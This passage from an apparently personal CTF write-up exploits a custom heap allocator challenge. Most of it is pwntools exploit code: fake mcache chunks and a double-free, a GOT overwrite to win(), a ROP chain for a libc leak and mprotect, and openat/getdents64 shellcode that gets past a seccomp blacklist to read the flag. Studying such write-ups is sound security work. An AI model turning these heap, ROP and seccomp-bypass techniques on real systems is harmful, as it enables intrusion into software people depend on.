</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>mcache_entry</span> <span class=o>*</span><span class=n>e</span> <span class=o>=</span> <span class=n>mcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>midx</span><span class=p>];</span>  <span class=c1>// [rsp+20h] [rbp-20h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>mcache</span><span class=o>-&gt;</span><span class=n>entries</span><span class=p>[</span><span class=n>midx</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>mcache_entry</span> <span class=o>*</span><span class=p>)</span><span class=n>e</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>--</span><span class=n>mcache_</span><span class=o>-&gt;</span><span class=n>counts</span><span class=p>[</span><span class=n>midx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>mcache_</span> <span class=o>!=</span> <span class=p>(</span><span class=n>mcache_struct</span> <span class=o>*</span><span class=p>)</span><span class=n>e</span><span class=o>-&gt;</span><span class=n>mcache</span> <span class=p>)</span> <span class=p>{</span> <span class=c1>// ! need to ensure that (void*)entries[-1][2] == mcache
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Mcache: Invalid verify&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>e</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>e</span><span class=o>-&gt;</span><span class=n>mcache</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>remove_id</span><span class=p>(</span><span class=n>e</span><span class=o>-&gt;</span><span class=n>id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>&amp;</span><span class=n>e</span><span class=o>-&gt;</span><span class=n>mcache</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>This effectively means that <code>mcache->entries[-1]</code> needs to point to a known region of user-controlled data, like the mound. I&rsquo;ll use this bug to allocate a fake chunk with a valid mcache size.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>fake_mcache_entry</span><span class=p>(</span><span class=n>sz</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>fd</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>rid</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>mcache</span><span class=o>=</span><span class=mh>0xbeef0000010</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rid</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> <span class=n>rid</span> <span class=o>=</span> <span class=n>r64</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>fit</span><span class=p>(</span><span class=n>rid</span><span class=p>,</span> <span class=n>sz</span><span class=p>,</span> <span class=n>mcache</span><span class=p>,</span> <span class=n>fd</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>fake_mcache_entry</span><span class=p>(</span><span class=mh>0x100</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=c1># chunk to be overflowed</span>
</span></span><span class=line><span class=cl><span class=n>fake_mcache_addr</span> <span class=o>=</span> <span class=mh>0xbeef0000100</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span><span class=p>,</span><span class=n>b</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>fake_mcache_addr</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>chunk_sz</span> <span class=o>=</span> <span class=mh>0x120</span><span class=o>+</span><span class=n>i</span><span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl>    <span class=n>user_sz</span> <span class=o>=</span> <span class=n>chunk_sz</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl>    <span class=c1># TODO: how to get b &gt; 0xf?</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>b</span><span class=p>):</span> <span class=n>add</span><span class=p>(</span><span class=n>user_sz</span><span class=p>,</span> <span class=mh>0xf</span><span class=o>-</span><span class=n>i</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;garbage&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>b</span><span class=p>):</span> <span class=n>free</span><span class=p>(</span><span class=mh>0xf</span><span class=o>-</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=c1># trigger bug</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>There&rsquo;s a <code>TODO</code> in there, and I&rsquo;ll explain. The problem with incrementing <code>mcache->counts[0x10:0x18]</code> one-by-one is that there aren&rsquo;t enough pointers to go around. By right, if <code>sizeof(arr[])</code> is only <code>0x10</code>, the maximum value for <code>mcache->counts[]</code> should be 0x10 as well.</p><p>I struggled with this for a while. The only way to put more pointers onto the mcache is to do a double-free, but the ID verification list got in the way of that. It was about at this point that I gained a partial understanding of the strategy outlined in <a href=#fake-ids rel>Fake IDs</a>, and I started work on an odd, roundabout method of achieving much of the same<sup>4</sup>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># The substance of the exploit: getting mcache-&gt;entries[-1] to point to a fake mchunk</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>midx</span><span class=p>,</span><span class=n>b</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>((</span><span class=n>i</span><span class=o>+</span><span class=n>midxs</span><span class=o>.</span><span class=n>entries</span><span class=p>,</span><span class=n>b</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span><span class=p>,</span><span class=n>b</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>fakechunk</span><span class=p>))</span> <span class=k>if</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>pad</span><span class=p>(</span><span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span> <span class=k>return</span> <span class=n>s</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>strdup</span><span class=p>(</span><span class=n>pad</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>),</span> <span class=mh>0xf</span><span class=p>)</span> <span class=c1># Remember that maximally, user_sz = 8 (mod 0x10) for a given glibc heap chunk.</span>
</span></span><span class=line><span class=cl>    <span class=n>strdup</span><span class=p>(</span><span class=n>pad</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>),</span> <span class=mh>0xe</span><span class=p>)</span> <span class=c1># A string has a trailing nul-byte, so maximally strlen(s) = 7 (mod 0x10)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>midx</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;hi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>pred</span> <span class=o>:=</span> <span class=n>r64bit</span><span class=p>())</span><span class=o>&gt;&gt;</span><span class=mi>56</span><span class=p>:</span> <span class=n>add</span><span class=p>(</span><span class=n>midx</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;hi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>b</span><span class=p>):</span>    <span class=c1># continually double-free to boost -&gt;counts[]</span>
</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>edit</span><span class=p>(</span><span class=mh>0xf</span><span class=p>,</span> <span class=n>pad</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>r64</span><span class=p>())[:</span><span class=mi>7</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=mh>0xe</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>edit</span><span class=p>(</span><span class=mh>0xf</span><span class=p>,</span> <span class=n>pad</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>pred</span><span class=p>)[:</span><span class=mi>7</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>incrementer</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># , free it + a chunk right in front of it, overflow into the real freed chunk&#39;s metadata to</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>bugged</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=c1># Get the fake chunk allocated,</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># free it + the chunk overlapping with the fake chunk</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># prepare to overwrite freed mchunk metadata such that -&gt;next points to a fake chunk on the mound_arena</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>fakechunk</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;overwrite!&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>fake_mcache_entry</span><span class=p>(</span><span class=n>sz</span><span class=o>=</span><span class=mi>999</span><span class=p>,</span> <span class=n>fd</span><span class=o>=</span><span class=n>mound_arena</span><span class=o>.</span><span class=n>mcache</span><span class=o>-</span><span class=mh>0x10</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>overflower</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;hi&#39;</span><span class=p>)</span> <span class=c1># put the fake mound_arena chunk on the mcache</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>overflower</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>fit</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>mcache</span><span class=p>,</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;setvbuf&#39;</span><span class=p>]))</span> <span class=c1># replace mound_arena-&gt;top with the GOT</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>got_overwriter</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>win</span><span class=p>))</span> <span class=c1># overwrite a good function with win() (I use scanf() here)</span>
</span></span></code></pre></td></tr></table></div></div><p>And that&rsquo;s how I used an mcache dup without ever noticing <em>I had an mcache dup</em>. An exploit method so abstruse, it remains 30x slower than the intended solution after optimisation<sup>5</sup>.</p><p>With that mess covered, I can route your attention back to <code>win()</code>.</p><h2 id=using-win>Using <code>win()</code></h2><p>The seccomp filter for this challenge is mildly interesting. Normally, seccomp&rsquo;d binaries have a <em>whitelist</em> for permitted syscalls, but in this situation, there&rsquo;s only a <em>blacklist</em> against a few. The blacklisted items give pause for thought: both <code>execve</code> and <code>open</code> are banned, and normally you&rsquo;d use the former to pop a shell, and the latter for an <a href=https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/ target=_blank rel="noopener noreffer">open-read-write</a> chain.</p><p>But before I get ahead of myself, let&rsquo;s talk about how to get to arbitrary syscalls first.</p><h3 id=moving-to-rwx>Moving to rwx</h3><p>There aren&rsquo;t a lot of gadgets in the main binary, so it might be better to leak libc first.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>R</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x48</span><span class=o>*</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>puts</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>win</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;;)</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>R</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>unpack</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=mi>6</span><span class=p>],</span> <span class=s1>&#39;all&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Once that&rsquo;s done, I can abuse gadgets in libc to convert the <code>mound_data</code> memory region into an rwx page:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>R</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x48</span><span class=o>*</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>mprotect</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>base</span><span class=p>,</span> <span class=mh>0x400000</span><span class=p>,</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;;)</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>R</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>This only makes sense if <code>mound_data.shellcode</code> actually points to an area of user-written shellcode. I handled this by writing shellcode to <code>mound_data</code> using <code>add()</code>, long before the mcache dup happens:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># ... everything up until the first few add() calls ...</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=o>...</span> <span class=c1># I&#39;m about to cover this part.</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span> <span class=c1># don&#39;t call asm() twice</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sc</span><span class=p>),</span> <span class=mi>8</span><span class=p>,</span> <span class=n>sc</span><span class=p>)</span> <span class=c1># dump shellcode somewhere in mound_data for later use</span>
</span></span><span class=line><span class=cl><span class=c1># ... everything else, e.g. getting mcache dup ...</span>
</span></span></code></pre></td></tr></table></div></div><p>Figuring out <em>what</em> shellcode to run isn&rsquo;t too difficult, if you have a <a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ target=_blank rel="noopener noreffer">syscall reference</a> in hand. This challenge shows why you shouldn&rsquo;t use a seccomp blacklist: <code>open</code> might be banned, but <a href=https://linux.die.net/man/2/openat target=_blank rel="noopener noreffer">openat</a> certainly isn&rsquo;t. I&rsquo;ll start off with some shellcode to open the <code>/pwn/</code> folder:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>pushstr</span><span class=p>(</span><span class=s1>&#39;/pwn&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>openat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;rsp&#39;</span><span class=p>,</span> <span class=n>O_DIRECTORY</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;mov QWORD PTR [</span><span class=si>{}</span><span class=s1>], rax</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=mh>0xbeef0000000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>getdents64</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=mh>0xbeef0010000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>)</span> <span class=c1># use getdents() to list a directory</span>
</span></span></code></pre></td></tr></table></div></div><p>After that, I&rsquo;ll apply a basic assembly loop to search for <code>.txt</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>mov</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=mh>0xbeef0010000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;loop:</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;inc rax</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;cmp DWORD PTR [rax], </span><span class=si>{}</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>u32</span><span class=p>(</span><span class=s1>&#39;.txt&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;jne loop</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># End result: *(int*)rax == u32(&#34;.txt&#34;)</span>
</span></span></code></pre></td></tr></table></div></div><p>Since the flag&rsquo;s filename is always 0x20+4 bytes long, the beginning of the flag filename will be at <code>rax-0x20</code> , and I can use <code>openat</code> again to write the flag to stdout:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;lea rbx, [rax-0x20]</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;mov rax, QWORD PTR [</span><span class=si>{}</span><span class=s1>]</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=mh>0xbeef0000000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>openat</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=s1>&#39;rbx&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>          <span class=c1># i.e. shellcraft.cat(&#39;rbx&#39;), but</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=mh>0xdead0000000</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span>  <span class=c1># because pwntools uses SYS_open </span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0xdead0000000</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span>     <span class=c1># I have to do this in 3 lines.</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=getting-the-flag>Getting the flag</h3><p>For reference, this is what the full script should look like at this point:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>randint</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>namedtuple</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ctypes</span> <span class=kn>import</span> <span class=n>CDLL</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwnscripts</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BEEF</span><span class=p>,</span> <span class=n>DEAD</span> <span class=o>=</span> <span class=mh>0xbeef0000000</span><span class=p>,</span> <span class=mh>0xdead0000000</span>
</span></span><span class=line><span class=cl><span class=n>mound_arena</span> <span class=o>=</span> <span class=n>namedtuple</span><span class=p>(</span><span class=s1>&#39;mound_metadata&#39;</span><span class=p>,</span> <span class=s1>&#39;base ids mcache top&#39;</span><span class=p>)(</span><span class=n>DEAD</span><span class=p>,</span> <span class=n>DEAD</span><span class=o>+</span><span class=mh>0x8</span><span class=p>,</span> <span class=n>DEAD</span><span class=o>+</span><span class=mh>0x8008</span><span class=p>,</span> <span class=n>DEAD</span><span class=o>+</span><span class=mh>0x8010</span><span class=p>)</span>
